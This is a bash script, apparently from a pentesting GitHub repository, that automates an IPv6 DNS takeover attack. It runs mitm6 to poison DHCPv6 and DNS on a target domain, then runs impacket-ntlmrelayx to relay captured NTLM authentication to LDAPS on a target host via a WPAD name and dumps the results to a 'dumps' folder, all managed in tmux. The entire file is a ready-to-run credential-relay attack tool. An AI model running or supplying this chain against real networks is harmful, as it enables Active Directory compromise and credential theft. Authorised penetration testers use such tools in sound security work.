#!/bin/bash

# ===============================================================
# hexahavoc.sh - IPv6 DNS Takeover Automation Script
# ---------------------------------------------------------------
# This script automates the setup of an IPv6 DNS takeover attack 
# using mitm6 and impacket-ntlmrelayx, leveraging tmux to manage 
# the session. Designed for network administrators and pentesters
# to identify potential vulnerabilities in IPv6 DNS handling.
#
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# ===============================================================

# Define color variables
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
CYAN="\033[36m"
RESET="\033[0m"

# Define log file
log_file="hexahavoc_$(date '+%Y%m%d_%H%M%S').log"

# Redirect output to log file and console
exec > >(tee -a "$log_file") 2>&1

# Check if a command exists
check_command() {
  if ! command -v "$1" &> /dev/null; then
    echo -e "${RED}Error: $1 is not installed. Please install it before running this script.${RESET}"
    exit 1
  fi
}

# Print usage information
usage() {
  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-v] [-o <impacket_options>]${RESET}"
  echo -e "${YELLOW}Options:${RESET}"
  echo -e "  -d  Specify the target domain"
  echo -e "  -t  Specify the target IP"
  echo -e "  -i  Specify the network interface (default: eth0)"
  echo -e "  -v  Enable verbose logging"
  echo -e "  -o  Additional options for impacket-ntlmrelayx"
  exit 1
}

# Initialize variables with default values
target_domain=""
target_ip=""
interface="eth0"
verbose=0
impacket_options=""
session_name="ipv6_dns_takeover_$(date '+%H%M%S')"

# Parse command-line arguments
while getopts ":d:t:i:vo:" opt; do
  case "$opt" in
    d) target_domain="$OPTARG" ;;
    t) target_ip="$OPTARG" ;;
    i) interface="$OPTARG" ;;
    v) verbose=1 ;;
    o) impacket_options="$OPTARG" ;;
    \?) usage ;;
  esac
done

# Ensure required arguments are provided
if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
  echo -e "${RED}Error: Both -d (target_domain) and -t (target_ip) arguments are required.${RESET}"
  usage
fi

# Validate target domain
if ! [[ "$target_domain" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo -e "${RED}Error: Invalid domain format.${RESET}"
  exit 1
fi

# Validate target IP (basic check for IPv4/IPv6)
if ! [[ "$target_ip" =~ ^[0-9a-fA-F:.]+$ ]]; then
  echo -e "${RED}Error: Invalid IP address format.${RESET}"
  exit 1
fi

# Check dependencies
echo -e "${CYAN}Checking dependencies...${RESET}"
check_command "tmux"
check_command "mitm6"
check_command "impacket-ntlmrelayx"

# Enable verbose logging if requested
if [ "$verbose" -eq 1 ]; then
  echo -e "${YELLOW}Enabling verbose mode...${RESET}"
  set -x
fi

# Handle cleanup on script interruption
trap 'echo -e "${RED}Script interrupted. Cleaning up...${RESET}"; tmux kill-session -t "$session_name" 2>/dev/null; exit 1' INT

# Check if the tmux session already exists
echo -e "${CYAN}Checking if the tmux session '$session_name' already exists...${RESET}"
if tmux has-session -t "$session_name" 2>/dev/null; then
  echo -e "${GREEN}Session exists. Attaching...${RESET}"
  tmux -CC attach-session -t "$session_name"
  exit 0
fi

# Create a new tmux session
echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
tmux new-session -d -s "$session_name"

# Create the first window for mitm6
echo -e "${CYAN}Starting mitm6 in the tmux session...${RESET}"
tmux send-keys -t "$session_name:0.0" "mitm6 -i $interface -d $target_domain" C-m
tmux rename-window -t "$session_name:0" 'mitm6'

# Create the second window for impacket-ntlmrelayx
echo -e "${CYAN}Starting impacket-ntlmrelayx in the tmux session...${RESET}"
tmux new-window -t "$session_name:1" -n 'impacket-ntlmrelayx'
tmux send-keys -t "$session_name:1" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh VCwpad.$target_domain -l dumps $impacket_options" C-m

# Create dumps directory if it doesn't exist
dumps_dir="dumps"
if [ ! -d "$dumps_dir" ]; then
  mkdir -p "$dumps_dir"
else
  echo -e "${YELLOW}Warning: Dumps directory already exists. Results may be overwritten.${RESET}"
fi

# Attach to the tmux session
echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
tmux -CC attach-session -t "$session_name"

# Disable verbose logging
if [ "$verbose" -eq 1 ]; then
  echo -e "${YELLOW}Disabling verbose mode...${RESET}"
  set +x
fi

# Display summary
echo -e "${GREEN}Setup complete.${RESET}"
echo -e "${CYAN}Session Name: ${RESET}${session_name}"
echo -e "${CYAN}Target Domain: ${RESET}${target_domain}"
echo -e "${CYAN}Target IP: ${RESET}${target_ip}"
echo -e "${CYAN}Log File: ${RESET}${log_file}"
